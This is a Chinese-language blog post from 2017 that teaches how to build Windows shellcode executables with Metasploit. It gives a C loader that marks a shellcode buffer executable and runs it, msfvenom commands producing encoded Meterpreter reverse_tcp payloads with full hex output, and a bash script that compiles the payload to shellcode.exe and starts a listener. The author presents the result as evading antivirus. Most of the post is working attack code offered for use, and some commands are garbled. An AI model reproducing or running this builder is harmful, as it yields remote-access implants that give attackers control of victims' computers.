---
title: 我的shellcode编写之路 | MSF| Shellcode  | kali linux 2017
date: 2017-09-15 20:36:20
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->

## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/secist-shellcode.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=27630183&auto=0&height=66"></iframe>

## 1.我有一个大胆的想法
其实shellcode的这篇的灵感也是在与和车王两人的沟通，在他的带领下 也是才知道https://www.exploit-db.com/  原来也有shellcode的一篇新的视角，也是在第二天的时间，也是偷偷的趁着上班的空余时间 研究了一下，上帝第一视角。也是蛮有意思的事情。在shellcode中包含了很多平台的shellcode。
![enter description here][2]

## 2.无心插柳柳成荫
当我无意间浏览到某篇文章后，已经吸引了我的注意力了
https://www.exploit-db.com/exploits/37758/
![enter description here][3]


## 3.shellcode 弹窗hellword 警告窗口
```markdown
# include <stdlib.h>
# include <stdio.h>
# include <string.h>
 
# include <windows.h>
 
 
int
main(void)
{
  char *shellcode = "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
    "\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
    "\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
    "\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
    "\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
    "\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
    "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
    "\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
    "\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
    "\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
    "\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
    "\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
    "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
    "\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
    "\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
    "\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
    "\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
    "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
    "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
    "\x69\x74\x54\x53\xff\xd6\x57\xff\xd0";
 
  DWORD why_must_this_variable;
  BOOL ret = VirtualProtect (shellcode, strlen(shellcode),
    PAGE_EXECUTE_READWRITE, &why_must_this_variable);
 
  if (!ret) {
    printf ("VirtualProtect\n");
    return EXIT_FAILURE;
  }
 
  printf("strlen(shellcode)=%d\n", strlen(shellcode));
 
  ((void (*)(void))shellcode)();
 
  return EXIT_SUCCESS;
}
```
我们来手动的进行编译一下看看具体的效果如何 是不是和他说的一样 会弹框 （hello word）
![enter description here][4]
  
   1.可以看到弹窗的内容是 helloword ，也可以看到代码中并无helloword的字符串以及MessageBox 的调用，也就是相关重点的代码就在于shellcode的硬编码。
   
   2.那么这就让我想到了msfvenom的shellcode代码 ，由msfvenom生成的恶意的shellcode的。也就是以c生成shellcode硬编码。相关如何的msfvenom 

   3.也可以在https://github.com/demonsec666/secist_script 中找到我之前录制的msf课程中的第五课 也有提到过msfvenom的教程 ，亦可以查看官方文档https://www.offensive-security.com/metasploit-unleashed/msfvenom/
   
   
   ![enter description here][5]
   
##  4.shellcode_msfvenom
本篇就以/www.offensive-security.com 中的msfvenom 教程为例

![enter description here][6]


```markdown
root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"
buf += "\x6d\xfc\x58\xba\x82\xf9\xc0\x9a\x35\x72\x7d\x01\x9b"
buf += "\xe7\x31\x16\x82\xf6\xe2\x89\x89\x75\x67\xf7\xaa\xae"
buf += "\x73\x88\x3f\xf5\x6d\x3d\x9e\xab\x06\xda\xff\x42\x7a"
buf += "\x63\x6b\x72\x59\xf6\x58\xa5\xfe\x3f\x0b\x41\xa0\xf2"
buf += "\xfe\x2d\xc9\x32\x3d\xd4\x51\xf7\xa7\x56\xf8\x69\x08"
buf += "\x4d\x27\x8a\x2e\x19\x99\x7c\xfc\x63\xfa\x5c\xd5\xa8"
buf += "\x1f\xa8\x9b\x88\xbb\xa5\x3c\x8f\x7f\x38\x45\xd1\x71"
buf += "\x34\x59\x84\xb0\x97\xa0\x99\xcc\xfe\x7f\x37\xe2\x28"
buf += "\xea\x57\x01\xcf\xf8\x1e\x1e\xd8\xd3\x05\x67\x73\xf9"
buf += "\x32\xbb\x76\x8c\x7c\x2f\xf6\x29\x0f\xa5\x36\x2e\x73"
buf += "\xde\x31\xc3\xfe\xae\x49\x64\xd2\x39\xf1\xf2\xc7\xa0"
buf += "\x06\xd3\xf6\x1a\xfe\x0a\xfe\x28\xbe\x1a\x42\x9c\xde"
buf += "\x01\x16\x27\xbd\x29\x1c\xf8\x7d\x47\x2c\x68\x06\x0e"
buf += "\x23\x31\xfe\x7d\x58\xe8\x7b\x76\x4b\xfe\xdb\x17\x51"
buf += "\xfa\xdf\xff\xa1\xbc\xc5\x66\x4b\xea\x23\x86\x47\xb4"
buf += "\xe7\xd5\x71\x77\x2e\x24\x4a\x3d\xb1\x6f\x12\xf2\xb2"
buf += "\xd0\x55\xc9\x23\x2e\xc2\xa5\x73\xb2\xc8\xb7\x7d\x6b"
buf += "\x55\x29\xbc\x26\xdd\xf6\xe3\xf6\x25\xc6\x5c\xad\x9c"
buf += "\x9d\x18\x08\x3b\xbf\xd2\xff\x92\x18\x5f\x48\x9b\xe0"
buf += "\x7b\x03\xa5\x32\x11\x27\x2b\x25\xcd\x44\xdb\xbd\xb9"
buf += "\xcd\x48\xda\x56\x4c\x56\xd5\x04\x87\x48\x3a\x6b\x9c"
buf += "\x2a\x15\x4d\xbc\x0b\x56\x06\xb5\xc9\x46\xd0\xfa\x68"
buf += "\xa6\x76\xe9\x52\x2c\x24\x62\x28\xe1\x1d\x87\xb0\x66"
buf += "\x93\x85\x8f\x87\x0f\xcf\x16\x29\x76\x03\x55\x0c\x0e"
buf += "\x3f\x17\xac"
```
可以看到使用msfvenom 自动帮我们生成恶意的shellcode
1.其中的-a 代表 的是目标的架构 如：x86

2.--platform 代表的是一个目标机的平台 如： windows

3.那么-p 呢  代表的是msf的payload的以及-e 和-b 呢 代表这个 encoder编码器，-b 表示去除硬编码中的0x00代码，因为0x00代表着结束的符号，所以我们不能让他出现0x00这个代码。

4.最后的 -i 和-f 分别代表的是iterations和format （迭代次数和格式）

那么我们将其代码重新改改，我们比如需要的功能是meterperter、指定ip和端口、指定shellcode 编码格式如：c或者python等代码

```markdown
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击者
IP地址  LPORT=攻击者端口  -e x86/shikata_ga_nai -b '\x00' -i 迭代次数  -f  c
```

那么简短来说就是
```markdown
-p去指定payload为 windows/meterpreter/reverse_tcp
LHOST 和LPORT 指定攻击者ip和端口
-e指定x86/shikata_ga_nai 编码器
-i 指定迭代为如 5次 或10次等
-f 指定输出的格式 如c 代码 、或者python等其他格式的代码 
-f参数可以参考msfvenom的帮助参数 查看-f的支持格式
```

![enter description here][7]

## 6.shellcode_c_msf
最终我们可以得到由msfvenom 生成C的shellcode代码

```markdown
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 4 -f c
Found 1 compatible encoders
Attempting to encode payload with 4 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai succeeded with size 387 (iteration=1)
x86/shikata_ga_nai succeeded with size 414 (iteration=2)
x86/shikata_ga_nai succeeded with size 441 (iteration=3)
x86/shikata_ga_nai chosen with final size 441
Payload size: 441 bytes
Final size of c file: 1878 bytes
unsigned char buf[] = 
"\xd9\xe1\xbf\xc4\xbd\x41\x38\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x68\x31\x7e\x19\x83\xee\xfc\x03\x7e\x15\x26\x48\x9a\xec\x1c"
"\x99\x40\x70\xdd\x07\x0e\xae\xe9\xe6\xc6\x67\xa0\x76\x28\x2e"
"\xd8\x7b\x1c\xd4\x5f\x95\x5c\x0a\x80\xed\x24\xaf\x55\xee\xe0"
"\xf9\x80\x7f\x1a\x88\x1f\xde\xba\xa7\x09\x17\x25\x1f\x2c\x37"
"\x5d\x53\x6c\x7a\x01\xd2\x99\x69\x5b\x61\x14\x0a\xe1\x2b\xe1"
"\x62\x0c\x07\x9b\x67\xe4\x56\x2f\xf8\xa0\x7e\xdd\xfe\x6d\x0f"
"\xa2\x0e\xfc\x24\xcd\xce\xc0\xa3\x8b\x96\xe5\x1b\x26\xbd\x58"
"\x8d\xcc\x2b\x71\xe4\x37\xda\xb7\xca\x2e\xe1\xe2\x19\xd9\xbf"
"\x29\x5c\xed\x2b\x32\x0f\x9f\x81\x59\xf9\x3b\x31\x57\xe1\x38"
"\x75\x55\xa9\xa8\x30\x8e\xa2\x1e\x9e\x65\xaa\x5f\xe7\x43\xc7"
"\x1e\x06\xc7\x6d\x0f\xb8\x09\xf1\xa7\xaa\x3e\x82\xb0\xf5\x7e"
"\xf6\x08\xe1\x90\xc5\x98\xd0\x11\xe9\x78\xd6\xa6\x44\xf4\x1a"
"\xe9\x7d\x83\xec\x57\xd9\xb5\x80\x0b\x5f\x98\xc8\xec\xeb\x3f"
"\x09\x17\xc8\xad\x8a\x5f\xc6\x6f\x8f\xa3\x11\x7c\x7c\x3e\x25"
"\x44\x62\xbd\xd3\x94\xe8\x0b\x3e\xd9\xbe\x05\x71\x89\x98\x6b"
"\xe3\x4a\x36\x34\x9e\xa6\x90\xee\x69\x13\x16\xa0\x9a\xf5\x68"
"\x53\x22\xdc\x6f\x59\x54\x53\x8a\x25\x31\x40\x3e\x03\x85\xc9"
"\x3b\x1c\xb9\xb1\x6b\xe9\x42\xec\xda\x5f\x24\x8a\x81\x37\x90"
"\xe3\xb0\xe8\xd7\xfe\x8e\xfc\x0b\xc4\xde\x75\x73\x40\x14\x24"
"\x2c\x03\xf0\xfd\x65\x7c\xbf\xe8\xd3\xa2\x80\x16\xd1\x32\x36"
"\x36\x30\x1e\x71\x4f\xe9\x60\x47\x91\xcf\x0c\xf0\xeb\xc3\xe6"
"\xbf\x98\x1a\x3a\x38\xfa\x56\x40\x9e\x4e\x51\xc2\xcb\xc2\x48"
"\xe5\xbf\x0d\xec\xb2\x37\x01\x9f\x7a\xdf\x3a\xde\x30\xe0\x04"
"\xb6\x07\x5e\x5c\x65\x1c\xfd\x24\x02\xbd\x8f\x2c\xba\xdc\xbd"
"\x27\x2a\xe0\x08\x74\xf9\xda\x8b\x4a\xaf\x46\xaf\x67\xd1\x42"
"\x9d\xb5\x11\x70\xd7\x5c\xf0\x36\x1f\x87\x42\x99\xa4\x57\x64"
"\x8f\xf7\xda\x03\x42\x35\x85\x6e\xd5\x6b\xa6\xcd\xdb\x8c\x2f"
"\x37\x62\xef\xfe\x61\xab\xeb\xde\x37\xd8\x5e\x77\x7f\x86\x18"
"\x88\x80\xd4\x02\xe7\x8b";
```

![enter description here][8]

## 7.编译、监听、运行
那么我们得了到了msfvenom生成的shellcode，那么我们将其带入之前弹框的hellword代码中,写出以下代码：
```markdown
# include <stdlib.h>
  # include <stdio.h>
  # include <string.h>

  # include <windows.h>


  int
  main(void)
  {
  	char *shellcode =

    #Shellcode的代码
"\xd9\xe1\xbf\xc4\xbd\x41\x38\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x68\x31\x7e\x19\x83\xee\xfc\x03\x7e\x15\x26\x48\x9a\xec\x1c"
"\x99\x40\x70\xdd\x07\x0e\xae\xe9\xe6\xc6\x67\xa0\x76\x28\x2e"
"\xd8\x7b\x1c\xd4\x5f\x95\x5c\x0a\x80\xed\x24\xaf\x55\xee\xe0"
"\xf9\x80\x7f\x1a\x88\x1f\xde\xba\xa7\x09\x17\x25\x1f\x2c\x37"
"\x5d\x53\x6c\x7a\x01\xd2\x99\x69\x5b\x61\x14\x0a\xe1\x2b\xe1"
"\x62\x0c\x07\x9b\x67\xe4\x56\x2f\xf8\xa0\x7e\xdd\xfe\x6d\x0f"
"\xa2\x0e\xfc\x24\xcd\xce\xc0\xa3\x8b\x96\xe5\x1b\x26\xbd\x58"
"\x8d\xcc\x2b\x71\xe4\x37\xda\xb7\xca\x2e\xe1\xe2\x19\xd9\xbf"
"\x29\x5c\xed\x2b\x32\x0f\x9f\x81\x59\xf9\x3b\x31\x57\xe1\x38"
"\x75\x55\xa9\xa8\x30\x8e\xa2\x1e\x9e\x65\xaa\x5f\xe7\x43\xc7"
"\x1e\x06\xc7\x6d\x0f\xb8\x09\xf1\xa7\xaa\x3e\x82\xb0\xf5\x7e"
"\xf6\x08\xe1\x90\xc5\x98\xd0\x11\xe9\x78\xd6\xa6\x44\xf4\x1a"
"\xe9\x7d\x83\xec\x57\xd9\xb5\x80\x0b\x5f\x98\xc8\xec\xeb\x3f"
"\x09\x17\xc8\xad\x8a\x5f\xc6\x6f\x8f\xa3\x11\x7c\x7c\x3e\x25"
"\x44\x62\xbd\xd3\x94\xe8\x0b\x3e\xd9\xbe\x05\x71\x89\x98\x6b"
"\xe3\x4a\x36\x34\x9e\xa6\x90\xee\x69\x13\x16\xa0\x9a\xf5\x68"
"\x53\x22\xdc\x6f\x59\x54\x53\x8a\x25\x31\x40\x3e\x03\x85\xc9"
"\x3b\x1c\xb9\xb1\x6b\xe9\x42\xec\xda\x5f\x24\x8a\x81\x37\x90"
"\xe3\xb0\xe8\xd7\xfe\x8e\xfc\x0b\xc4\xde\x75\x73\x40\x14\x24"
"\x2c\x03\xf0\xfd\x65\x7c\xbf\xe8\xd3\xa2\x80\x16\xd1\x32\x36"
"\x36\x30\x1e\x71\x4f\xe9\x60\x47\x91\xcf\x0c\xf0\xeb\xc3\xe6"
"\xbf\x98\x1a\x3a\x38\xfa\x56\x40\x9e\x4e\x51\xc2\xcb\xc2\x48"
"\xe5\xbf\x0d\xec\xb2\x37\x01\x9f\x7a\xdf\x3a\xde\x30\xe0\x04"
"\xb6\x07\x5e\x5c\x65\x1c\xfd\x24\x02\xbd\x8f\x2c\xba\xdc\xbd"
"\x27\x2a\xe0\x08\x74\xf9\xda\x8b\x4a\xaf\x46\xaf\x67\xd1\x42"
"\x9d\xb5\x11\x70\xd7\x5c\xf0\x36\x1f\x87\x42\x99\xa4\x57\x64"
"\x8f\xf7\xda\x03\x42\x35\x85\x6e\xd5\x6b\xa6\xcd\xdb\x8c\x2f"
"\x37\x62\xef\xfe\x61\xab\xeb\xde\x37\xd8\x5e\x77\x7f\x86\x18"
"\x88\x80\xd4\x02\xe7\x8b";

  	DWORD why_must_this_variable;
  	BOOL ret = VirtualProtect(shellcode, strlen(shellcode),
  		PAGE_EXECUTE_READWRITE, &why_must_this_variable);

  	if (!ret) {
  		printf("VirtualProtect\n");
  		return EXIT_FAILURE;
  	}
  	((void(*)(void))shellcode)();

  	return 0;
  }
 ```
 
 
 
 编译可以使用vs微软的编译器也可以和我一样使用tdm-gcc。
  ```markdown
 TDM-GCC是Windows的编译器套件。
它结合了最新的GCC工具集的稳定版本， Windows友好的几个补丁程序，以及免费和开源的 MinGW或 MinGW-w64运行时API，以创建Microsoft的编译器和平台SDK的开源替代软件。
它可以创建32位OR 64位二进制文​​件，适用于任何Windows版本的Windows 98。
它具有易于使用的单文件安装程序，只需点击几下即可创建工作安装，并可在新软件包可用时更新该安装。
它仅由命令行工具组成。如果您想要一个可视化IDE（文本编辑器，编译器接口，可视化调试器）， Code :: Blocks与TDM-GCC集成很好。
 ```
 关于TDM-GCC在我的项目中有提到过 https://github.com/demonsec666/secist_script
 
1.使用TDM-GCC 虽然有报错 ，但是也不影响最终得到会话的结果
2.其中的-M32 代表指的是32位 以及-W -Wall 是忽略警告的意思，其他的我就不用多说了吧
3.也可以使用vs进行编译生成exe。

![enter description here][9]
 
 ![enter description here][10]
 
 ![enter description here][11]
 
 以下是我在win下编译运行测试得到的结果，也是同样绕过杀软的安全防护
 
 ![enter description here][12]
 
 
##  8.Bash下的编写思路形成懒人自动化的脚本
我们要考虑几点内容：
1.如何将我们生成的shellcode代码代入到cpp当中
2.如何指定ip和端口 自动化的帮我们完成所有事情


 1.如何将我们生成的shellcode代码代入到cpp当中
 其实我们可以使用echo大法使用重定向到缓存文件中，echo 可以使用变量符合$ 将里面的命令括起来 将其输出的内容写入到缓存文件中期
 ![enter description here][13]

```markdown
 echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  LHOST
 =192.168.1.100 LPORTta_ga_nai -b '\x00' -i 4 -f c) >>  shellcode.txt
    ```
2.写到缓存文件我们是不是马上可以放入到cpp中去呢？其实不是 细心的朋友可以发现shellcode.txt中包含着 unsigned char buf[] = 的字符串。

所以我们需要用的一个命令 =>  sed ,使用sed 删除匹配unsigned char buf[] = 的字符串
也就是说得到以下命令
```markdown
sed 's/unsigned char buf\[\] =//g'
   ```
 以及完整的命令就是
 ```markdown
  echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  LHOST
  =192.168.1.100 LPORTta_ga_nai -b '\x00' -i 4 -f c)  | sed 's/unsigned char buf\[\] =//g' >>  
  shellcode.txt
    ```
	
	
 第一个问题解决了 讲msfvenom的shellcode存储到缓存文件中 ，那么我们需要得到完整的cpp文件该如何做呢，
  ```markdown
 echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  LHOST
  =192.168.1.100 LPORTta_ga_nai -b '\x00' -i 4 -f c)  | sed 's/unsigned char buf\[\] =//g' >>  
  shellcode.txt
  echo  "
  # include <stdlib.h>
  # include <stdio.h>
  # include <string.h>

  # include <windows.h>


  int
  main(void)
  {
  	char *shellcode =

    $Shellcode


  	DWORD why_must_this_variable;
  	BOOL ret = VirtualProtect(shellcode, strlen(shellcode),
  		PAGE_EXECUTE_READWRITE, &why_must_this_variable);

  	if (!ret) {
  		printf(\"VirtualProtect\n\");
  		return EXIT_FAILURE;
  	}
  	((void(*)(void))shellcode)();

  	return 0;
  }

  " >> output/shellcode.cpp
     ```
 我们将得到的shellcode.txt 使用cat命令 将它输出 并且存储在一个变量中，如我使用的变量$shellcode，并将其变量代入到c代码中去这样也就完整的输出成我们想要的编译文件。
 
 2.如何指定ip和端口 自动化的帮我们完成所有事情
 在bash编程中我们使用read语法 ，read 就是接受用户键入的字符串。
 那么我们可以将其写成这样的：
   ```markdown
   echo -e "       secist>请输入你的ip地址: \c"
  read ip
  echo -e "       secist>请输入你的端口: \c"
  read port
  echo -e "       secist>编码次数(1-500): \c"
  read encode
      ```
 分别将ip地址、端口、编码迭代次数。存储到ip、port、encode变量中。
 
##  9.开启上帝视角
 最终我的个人完整代码为：
 ```markdown
shellcode (){
clear

echo  -e "         < Shellcode Payload >"
echo  -e "          --------------------"
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo "  "
echo -e "  +------------++-------------------------++-----------------------+"
echo      "             即刻安全周年庆版v1.7 (secist----2017.7.14)"
echo " "
echo -e "            你的IP地址 :\c"
/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
echo "            系统版本 :$(cat /etc/issue)"
echo -e "  +------------++-------------------------++-----------------------+"
echo "  "
echo "        [1] Meterpreter_Reverse_tcp		 [5] Shell_reverse_tcp"
echo "        [2] Meterpreter_Reverse_http	         [6] exit"
echo "        [3] Meterpreter_Reverse_https		 "
echo "        [4] Meterpreter_Reverse_tcp_dns          "
echo "        [7] back meun     "
echo ""
echo -e "              secist> \c"
read option

#Aukeratu
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/meterpreter/reverse_tcp_dns'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
exit
;;
7)
menu
;;
*)
shellcode
;;
esac
if [ "$option" == "1" ]; then
  shellcode1
elif [ "$option" == "2" ]; then
  shellcode1
elif [ "$option" == "3" ]; then
  shellcode1

elif [ "$option" == "4" ]; then
  shellcode1

elif [ "$option" == "5" ]; then
  shellcode1
  
 elif [ "$option" == "6" ]; then
    exit

 elif [ "$option" == "7" ]; then
    menu
  fi
}

shellcode1(){
#定义了一个菜单为shellcode1
  echo -e "       secist>请输入你的ip地址: \c"
  read ip
  echo -e "       secist>请输入你的端口: \c"
  read port
  echo -e "       secist>编码次数(1-500): \c"
  read encode
  echo  $( msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=$ip  LPORT=$port -e x86/shikata_ga_nai -b '\x00' -i $encode -f c) | sed 's/unsigned char buf\[\] =//g' >> output/shellcode.txt
  Shellcode=$(cat output/shellcode.txt)
  echo  "
  # include <stdlib.h>
  # include <stdio.h>
  # include <string.h>

  # include <windows.h>


  int
  main(void)
  {
  	char *shellcode =

    $Shellcode


  	DWORD why_must_this_variable;
  	BOOL ret = VirtualProtect(shellcode, strlen(shellcode),
  		PAGE_EXECUTE_READWRITE, &why_must_this_variable);

  	if (!ret) {
  		printf(\"VirtualProtect\n\");
  		return EXIT_FAILURE;
  	}
  	((void(*)(void))shellcode)();

  	return 0;
  }

  " >> output/shellcode.cpp

  wine gcc -m32 -W -Wall -o output/shellcode.exe output/shellcode.cpp
  rm output/shellcode.txt output/shellcode.cpp
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "  | Name       ||  Descript   	          || Your Input             "
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
  echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
  echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
  echo -e "  +------------++-------------------------++-----------------------+"
  echo "use exploit/multi/handler" >> resource/handler.rc
  echo "set PAYLOAD $payload" >> resource/handler.rc
  echo "set LHOST $ip" >>  resource/handler.rc
  echo "set LPORT $port" >>  resource/handler.rc
  echo "exploit " >>  resource/handler.rc
  msfconsole -r  resource/handler.rc
}
```	
 
 
##  关注一下
 我已在GitHub中上传了相关脚本文件 各位可以自行下载和点个星关注下我们即刻安全
 https://github.com/demonsec666/secist_script
 
 欢迎加入即刻安全技术群，与我一起讨论 。群号:307283889
 
 
 
 
 
 
 
 
 


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/install-openvas-for-broad-vulnerability-assessment.1280x600.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505477898281.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505478268488.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/91D81B3717235DAA0518E2443145D3D2.png
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505482728515.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505482827337.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505484222188.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505484635934.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485668396.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485903488.jpg
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485863927.jpg
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/CACE2616E540CCD26C7E328C258F10AA.png
  [13]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1505486902561.jpg 